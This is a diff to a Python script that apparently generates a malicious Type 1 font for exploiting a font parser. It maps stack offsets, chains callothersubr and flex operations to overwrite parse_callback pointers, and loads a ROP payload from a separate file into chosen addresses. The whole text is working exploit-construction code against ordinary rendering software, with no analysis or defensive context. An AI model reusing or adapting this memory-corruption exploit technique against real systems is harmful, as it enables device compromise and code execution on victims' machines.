@@ -1,6 +1,9 @@
 # 0    0x70: stack
 # 256 0x470: top
 # ...
+# 313 0x554: num_subrs
+# 314 0x558: subrs
+# ...
 # 337 0x5b4: ?
 # 338 0x5b8: blend
 # 339 0x5bc: hint_mode
@@ -23,6 +26,14 @@
 
 import struct
 
+def wont_make_tsd_cry(numbers):
+    for number in numbers:
+        number %= (2**32)
+        if number >= (2**31): number -= (2**32)
+        if number == 0: continue
+        if -32000 <= number <= 32000: return False
+        return True
+
 def to_signed_dec(number):
     number %= (2**32)
     if number >= (2**31): number -= (2**32)
@@ -42,7 +53,7 @@ file1 = 'i am also a file'
 # these are read by the ROP stuff
 subrs[0] = encode_unknown(file0)
 subrs[1] = encode_unknown(file1)
-subrs[0] = '0 3735928559 setcurrentpoint return'
+#subrs[0] = '0 3735928559 setcurrentpoint return' # 0xdeadbeef
 
 # start flex
 subrs[2] = '0 1 callothersubr ' + '0 2 callothersubr '*7 + 'return'
@@ -68,20 +79,26 @@ main = '''3 0 setcurrentpoint
           0                    % start the <= chain
           '''
 
-addies = {0x33825249: '\x85\x5e\x13\x34', 0x31000000: 'return', 0x34000000: 'return'}
+addies = {0x33816765: open('../goo/catalog/final.txt').read(), 0x31000000: 'xxxx', 0x34000000: 'xxxx'}
 
 subrno = max(filter(lambda a: isinstance(a, int), subrs.keys())) + 1
 for addy, data in sorted(addies.items()):
-    parse_callback, = struct.unpack('I', data[:4])
-    data = data[4:]
-    assert parse_callback > 32000
-    subrs[subrno] = '0 %s dotsection setcurrentpoint return' % to_signed_dec(parse_callback)
-    #subrs[subrno+1] = encode_unknown(data)
-    subrno += 1
-
+    data = struct.unpack('I'*(len(data)/4), data)
+    parse_callback = data.pop(0)
     assert addy > 32000
+    assert parse_callback > 32000
+    assert wont_make_tsd_cry(data)
+    subr = '0 %s setcurrentpoint ' % to_signed_dec(parse_callback)
+    for number in data: subr += to_signed_dec(number) + ' '
+    subr += 'dotsection %d 42 callothersubr return' % len(data)
+
+    subrs[subrno] = subr
+    #subrs[subrno+1] = encode_unknown(data)
+
     # the dotsection is to make large_integer false
     main += '\n' + str(subrno) + ' 1 1 25 callothersubr pop ' + to_signed_dec(addy - 1) + ' dotsection 4 27 callothersubr pop\n'
+    
+    subrno += 1
 
 main += '''callsubr         % call the selected subr (which should push stuff, set y to an appropriate parse_callback,
                             % then come back down
